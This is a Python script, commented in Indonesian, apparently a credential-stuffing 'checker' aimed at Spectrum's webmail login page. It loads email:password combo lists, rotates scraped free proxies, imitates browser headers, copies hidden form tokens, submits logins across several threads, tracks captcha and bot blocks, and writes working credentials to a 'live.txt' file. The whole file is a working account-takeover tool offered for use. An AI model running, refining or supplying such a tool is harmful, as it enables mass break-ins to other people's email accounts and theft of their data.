import requests
from bs4 import BeautifulSoup
import random
import time
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Inisialisasi warna terminal
init(autoreset=True)

class SpectrumChecker:
    def __init__(self, combo_file, proxy_file, threads):
        self.url = "https://webmail.spectrum.net/index.php/mail/auth"
        self.combo_file = combo_file
        self.proxy_file = proxy_file
        self.threads = int(threads)
        self.proxies = self._load_proxies()
        self.valid_count = 0
        self.bad_count = 0
        self.captcha_count = 0
        
        self.logo = f"""
{Fore.CYAN}    ____   ____  _     _       ____   ____  _  _  _____ 
{Fore.CYAN}   |    \ |    || |   | |     |    | |    || || ||_   _|
{Fore.CYAN}   |  |  ||  |  || |   | |     |  |  ||  |  || || |  | |  
{Fore.CYAN}   |  |  ||  |  || |___| |___  |  |  ||  |  || || |  | |  
{Fore.CYAN}   |____/ |____||_____|_____| |____/ |____||_||_|  |_|  
{Fore.YELLOW}   =====================================================
{Fore.WHITE}   [+] NAME    : SPECTRUM SATELLITE CHECKER
{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}ACTIVE / ANTI-CAPTCHA LOGIC
{Fore.YELLOW}   =====================================================
        """

    def _load_proxies(self):
        """Mengambil proxy dari file atau scrape gratisan jika file kosong"""
        proxies = []
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
        
        if not proxies:
            print(f"{Fore.YELLOW}[!] Proxy file kosong. Mengambil proxy gratis dari API...")
            try:
                # Scrape proxy gratis sebagai cadangan
                res = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all")
                proxies = res.text.splitlines()
            except:
                print(f"{Fore.RED}[X] Gagal mengambil proxy gratis.")
        return proxies

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def _rotate_proxy(self):
        if not self.proxies:
            return None
        p = random.choice(self.proxies)
        return {"http": f"http://{p}", "https": f"http://{p}"}

    def _save(self, name, data):
        os.makedirs("results", exist_ok=True)
        with open(f"results/{name}", "a") as f:
            f.write(data + "\n")

    def check_account(self, credential):
        if ":" not in credential:
            return
        
        email, password = credential.split(":")
        proxy = self._rotate_proxy()
        session = requests.Session()
        
        # Header untuk meniru Browser asli
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://webmail.spectrum.net',
            'Referer': self.url
        }

        try:
            # Step 1: Ambil Token & Cookies
            res_get = session.get(self.url, proxies=proxy, timeout=10)
            
            # Deteksi Captcha Awal
            if "captcha" in res_get.text.lower() or "challenge" in res_get.text.lower():
                self.captcha_count += 1
                return

            soup = BeautifulSoup(res_get.text, 'html.parser')
            payload = {}
            for hidden in soup.find_all('input', type='hidden'):
                if hidden.get('name'):
                    payload[hidden.get('name')] = hidden.get('value', '')

            payload['email'] = email
            payload['password'] = password

            # Step 2: Login Request
            response = session.post(self.url, data=payload, headers=headers, proxies=proxy, timeout=15, allow_redirects=True)
            
            ts = self._get_time()
            content = response.text.lower()

            # Step 3: Logika Validasi Ketat
            # 'signout' atau 'logout' biasanya muncul di dashboard sukses
            if "signout" in content or "logout" in content or "inbox" in response.url:
                print(f"{Fore.GREEN}[{ts}] [LIVE] {email} | {password}")
                self._save("live.txt", f"{email}:{password}")
                self.valid_count += 1
            elif "invalid" in content or "incorrect" in content or "auth_failed" in content:
                print(f"{Fore.RED}[{ts}] [DIE]  {email}")
                self.bad_count += 1
            else:
                # Terdeteksi sebagai bot oleh server (Redirect balik ke login atau kena Captcha)
                print(f"{Fore.YELLOW}[{ts}] [RETRY] {email} (Bot Detected/Proxy Flagged)")
                self.captcha_count += 1

        except:
            # Error biasanya karena proxy mati
            pass

    def start(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(self.logo)
        
        if not os.path.exists(self.combo_file):
            print(f"{Fore.RED}File {self.combo_file} tidak ditemukan!")
            return

        with open(self.combo_file, 'r') as f:
            accounts = [line.strip() for line in f if line.strip()]

        print(f"Stats: {Fore.CYAN}{len(accounts)} Accounts {Fore.WHITE}| {Fore.CYAN}{len(self.proxies)} Proxies")
        print(f"{Fore.YELLOW}Satelit terhubung. Memulai pemindaian...\n")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.check_account, accounts)

        print(f"\n{Fore.CYAN}=====================================================")
        print(f"{Fore.GREEN}VALID: {self.valid_count} | {Fore.RED}DIE: {self.bad_count} | {Fore.YELLOW}RETRY/CAPTCHA: {self.captcha_count}")
        print(f"{Fore.CYAN}Selesai! Hasil ada di folder 'results/'")

if __name__ == "__main__":
    # Ubah konfigurasi di sini
    checker = SpectrumChecker(
        combo_file="combo.txt", 
        proxy_file="proxies.txt", 
        threads=5 # Jangan terlalu tinggi agar tidak cepat kena Captcha
    )
    checker.start()
